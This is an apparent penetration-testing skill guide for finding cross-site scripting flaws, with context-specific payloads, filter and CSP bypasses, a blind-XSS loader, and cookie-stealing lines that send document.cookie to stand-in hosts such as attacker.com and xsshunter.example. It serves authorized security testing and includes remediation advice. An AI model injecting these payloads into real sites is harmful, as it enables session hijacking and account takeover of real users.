---
name: testing-for-xss-vulnerabilities
description: >
  Tests web applications for Cross-Site Scripting (XSS) vulnerabilities by injecting JavaScript
  payloads into reflected, stored, and DOM-based contexts to demonstrate client-side code
  execution, session hijacking, and user impersonation. The tester identifies all injection
  points and output contexts, crafts context-appropriate payloads, and bypasses sanitization
  and CSP protections. Activates for requests involving XSS testing, cross-site scripting
  assessment, client-side injection testing, or JavaScript injection vulnerability testing.
domain: cybersecurity
subdomain: penetration-testing
tags: [XSS, cross-site-scripting, client-side-security, OWASP-A03, JavaScript-injection]
version: 1.0.0
author: mahipal
license: Apache-2.0
---
# Testing for XSS Vulnerabilities

## When to Use

- Testing web applications for client-side injection vulnerabilities as part of OWASP WSTG testing
- Evaluating the effectiveness of input sanitization and output encoding across all application features
- Assessing the protection provided by Content Security Policy (CSP) headers against XSS exploitation
- Demonstrating the impact of XSS through session hijacking, credential theft, or phishing overlay to stakeholders
- Testing single-page applications (React, Angular, Vue) for DOM-based XSS in client-side routing and rendering

**Do not use** against applications without written authorization, for deploying persistent XSS payloads that affect real users, or for exfiltrating actual user session tokens from production environments.

## Prerequisites

- Authorized scope defining the target web application and acceptable testing activities
- Burp Suite Professional with XSS-focused extensions (XSS Validator, Reflector, Active Scan++)
- Browser with developer tools and XSS testing extensions (HackBar, XSS Hunter)
- XSS Hunter or Burp Collaborator for out-of-band payload verification
- SecLists XSS payload lists and custom payloads for WAF bypass scenarios

## Workflow

### Step 1: Input and Output Mapping

Map every location where user input enters and is rendered by the application:

- **Reflected inputs**: Test every URL parameter, search field, error message, and HTTP header value that is reflected in the response
- **Stored inputs**: Identify features where input is saved and displayed later: user profiles, comments, forum posts, file names, support tickets, and chat messages
- **DOM inputs**: Identify client-side JavaScript that reads from `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`, or `localStorage` and writes to the DOM
- **Output context identification**: For each reflected input, determine the rendering context:
  - HTML body: `<div>USER_INPUT</div>`
  - HTML attribute: `<input value="USER_INPUT">`
  - JavaScript string: `var x = 'USER_INPUT';`
  - URL context: `<a href="USER_INPUT">`
  - CSS context: `<div style="color: USER_INPUT">`

### Step 2: Reflected XSS Testing

Test reflected injection points with context-appropriate payloads:

- **HTML body context**: `<script>alert(document.domain)</script>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`
- **HTML attribute context**: `" onfocus=alert(1) autofocus="`, `" onmouseover=alert(1) "`, `"><script>alert(1)</script>`
- **JavaScript string context**: `';alert(1)//`, `\';alert(1)//`, `</script><script>alert(1)</script>`
- **URL/href context**: `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>`
- **Inside HTML comments**: `--><script>alert(1)</script><!--`
- **Filter bypass payloads** (when basic payloads are blocked):
  - Case variation: `<ScRiPt>alert(1)</sCrIpT>`
  - Event handlers: `<details open ontoggle=alert(1)>`
  - SVG: `<svg><animate onbegin=alert(1) attributeName=x>`
  - Encoding: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`

### Step 3: Stored XSS Testing

Test persistent storage points that render input to other users:

- Submit XSS payloads to every stored input field identified in Step 1
- Use a unique identifier in each payload to track which inputs trigger: `<script>alert('XSS-PROFILE-001')</script>`
- Check all locations where the stored input is rendered (the same input may appear on multiple pages)
- Test file upload features with HTML files containing JavaScript, SVG files with embedded scripts, and filenames containing XSS payloads
- Test rich text editors by injecting payloads through the raw HTML mode or by manipulating the POST data after the client-side editor sanitizes
- Use XSS Hunter payloads (`"><script src=https://yourxsshunter.xss.ht></script>`) for blind stored XSS where the payload fires in an admin panel or internal tool you cannot directly access

### Step 4: DOM-Based XSS Testing

Analyze client-side JavaScript for unsafe DOM manipulation:

- **Source identification**: Search JavaScript for dangerous sources that read attacker-controlled input:
  - `document.location`, `document.URL`, `document.referrer`
  - `location.hash`, `location.search`, `location.href`
  - `window.name`, `postMessage` event data
- **Sink identification**: Search for dangerous sinks that write to the DOM:
  - `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`
  - `eval()`, `setTimeout()`, `setInterval()`, `Function()`
  - `element.setAttribute()` with event handlers, `jQuery.html()`, `.append()`, `v-html` (Vue), `dangerouslySetInnerHTML` (React)
- **Trace data flow**: Follow the path from source to sink. If user-controlled input reaches a dangerous sink without proper sanitization, DOM XSS exists.
- **Framework-specific testing**: Test React `dangerouslySetInnerHTML`, Angular template injection (`{{constructor.constructor('alert(1)')()}}`), Vue `v-html` directive

### Step 5: CSP Bypass and Advanced Exploitation

Test Content Security Policy effectiveness and demonstrate real-world impact:

- **CSP analysis**: Review the CSP header for weaknesses:
  - `unsafe-inline` in script-src allows inline scripts
  - `unsafe-eval` allows eval() and similar functions
  - Wildcard domains (`*.googleapis.com`) may host JSONP endpoints usable for CSP bypass
  - `base-uri` not set allows `<base>` tag injection to redirect relative script loads
- **JSONP bypass**: If CSP allows a domain with JSONP endpoints, use `<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>`
- **Impact demonstration**:
  - Session hijacking: `<script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>`
  - Credential phishing: Inject a fake login form overlay that submits to the attacker's server
  - Keylogging: Inject JavaScript that captures keystrokes on the page
  - Account takeover: Use XSS to change the victim's email address and trigger a password reset

## Key Concepts

| Term | Definition |
|------|------------|
| **Reflected XSS** | Non-persistent XSS where the injected payload is included in the server's response to the same request, requiring the victim to click a crafted URL |
| **Stored XSS** | Persistent XSS where the payload is saved on the server and served to other users who view the affected page |
| **DOM-Based XSS** | XSS that occurs entirely in the browser when client-side JavaScript reads attacker-controlled data and writes it to a dangerous DOM sink |
| **Content Security Policy** | HTTP response header that restricts which sources the browser can load scripts, styles, and other resources from, providing defense-in-depth against XSS |
| **Output Encoding** | Converting special characters to their HTML entity equivalents (e.g., `<` to `&lt;`) to prevent the browser from interpreting user input as code |
| **Sink** | A JavaScript function or DOM property that can cause code execution or HTML rendering if attacker-controlled data reaches it unsanitized |

## Tools & Systems

- **Burp Suite Professional**: HTTP proxy with active scanning for reflected and stored XSS, plus Repeater and Intruder for manual payload testing
- **XSS Hunter**: Hosted service that generates payloads which phone home with screenshots, cookies, and DOM content when triggered, essential for blind stored XSS
- **DOMPurify**: Client-side sanitization library used by developers to prevent XSS; testers should test for bypass techniques against the deployed version
- **Browser Developer Tools**: Console, Network, and Elements tabs for tracing DOM-based XSS data flows and testing payloads in real-time

## Common Scenarios

### Scenario: Stored XSS in Customer Support Ticket System

**Context**: An e-commerce platform has a customer support system where customers submit tickets that are viewed by support agents in an internal admin panel. The ticket submission form accepts HTML formatting.

**Approach**:
1. Submit a support ticket with a unique XSS Hunter payload in the ticket description
2. The payload fires when a support agent views the ticket in the admin panel, sending a callback with the agent's session cookie, page DOM, and screenshot
3. Use the captured admin session cookie to access the admin panel as the support agent
4. From the admin panel, access customer records, order data, and refund functionality
5. Document the attack chain: customer submits ticket -> agent views ticket -> XSS fires -> session stolen -> admin panel compromised
6. Test if CSP would have prevented the attack (in this case, no CSP header was present)

**Pitfalls**:
- Only testing for `<script>alert(1)</script>` and missing XSS that fires through event handlers or in non-HTML contexts
- Not testing stored XSS in features that render to administrative users (support tickets, user profiles viewed by admins)
- Ignoring DOM-based XSS in single-page applications where the server-side code is secure but client-side rendering is vulnerable
- Not checking for XSS in HTTP headers (Referer, User-Agent) that may be logged and rendered in admin dashboards

## Output Format

```
## Finding: Stored XSS in Support Ticket Description

**ID**: XSS-002
**Severity**: High (CVSS 8.1)
**Affected URL**: POST /api/tickets (submission), GET /admin/tickets/8847 (trigger)
**Parameter**: description (POST body)
**XSS Type**: Stored (persistent)

**Description**:
The support ticket description field does not sanitize HTML input before storing
it in the database. When a support agent views the ticket in the admin panel, the
unsanitized HTML is rendered in the agent's browser, allowing arbitrary JavaScript
execution in the context of the admin application.

**Proof of Concept**:
Submitted ticket with payload:
<img src=x onerror="fetch('https://xsshunter.example/callback?c='+document.cookie)">

The payload fired when the agent viewed the ticket, exfiltrating the admin session
cookie to the XSS Hunter server.

**Impact**:
An attacker can steal the session tokens of support agents and administrators,
gaining access to the admin panel with privileges to view customer PII, process
refunds, and modify orders. Affects all 23 support agents who view customer tickets.

**Remediation**:
1. Implement output encoding using a context-aware library (OWASP Java Encoder,
   DOMPurify for client-side rendering)
2. Deploy Content Security Policy header:
   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
3. Set HttpOnly flag on session cookies to prevent JavaScript access
4. Sanitize HTML input server-side using a whitelist approach (allow only safe tags)
```
